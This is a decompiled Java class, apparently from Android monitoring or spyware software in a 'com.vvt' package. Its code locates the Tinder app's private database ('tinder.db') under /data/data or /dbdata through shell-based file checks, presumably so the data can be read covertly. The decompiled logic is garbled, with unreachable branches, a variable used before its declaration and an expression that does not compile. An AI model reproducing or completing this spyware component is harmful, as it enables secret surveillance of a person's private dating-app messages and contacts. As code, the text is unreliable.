package com.vvt.n.a.f;

import com.vvt.ag.b;
import com.vvt.io.p;
import com.vvt.shell.ShellUtil;

public class a
{
  private static final String a = a.class.getSimpleName();
  private static final boolean b = com.vvt.ak.a.a;
  private static final boolean c = com.vvt.ak.a.e;
  
  public static String a()
  {
    int i = 3;
    Object localObject = null;
    int j = 2;
    int k = 1;
    boolean bool1 = false;
    String str1 = null;
    String[] arrayOfString = new String[j];
    Object[] arrayOfObject = new Object[i];
    arrayOfObject[0] = "/data/data";
    arrayOfObject[k] = "com.tinder";
    arrayOfObject[j] = "databases";
    String str2 = String.format("%s/%s/%s", arrayOfObject);
    arrayOfString[0] = str2;
    arrayOfObject = new Object[i];
    arrayOfObject[0] = "/dbdata/databases";
    arrayOfObject[k] = "com.tinder";
    String str3 = "databases";
    arrayOfObject[j] = str3;
    str2 = String.format("%s/%s/%s", arrayOfObject);
    arrayOfString[k] = str2;
    int n = arrayOfString.length;
    int i1 = 0;
    str2 = null;
    if (i1 < n)
    {
      str1 = arrayOfString[i1];
      boolean bool3 = ShellUtil.b(str1);
      if (!bool3) {}
    }
    for (;;)
    {
      boolean bool2 = b.a(str1);
      if (!bool2)
      {
        str2 = a(str1);
        boolean bool4 = b.a(str2);
        if (!bool4)
        {
          str1 = p.a(str1, str2);
          bool2 = ShellUtil.b(str1);
          if (bool2) {
            break label216;
          }
        }
      }
      for (;;)
      {
        bool1 = b;
        if (bool1) {}
        return (String)localObject;
        m = bool2 + true;
        bool2 = m;
        break;
        label216:
        localObject = str1;
      }
      int m = 0;
      str1 = null;
    }
  }
  
  public static String a(String paramString)
  {
    String str = "tinder.db";
    boolean bool = b;
    if (bool) {}
    return str;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/n/a/f/a.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */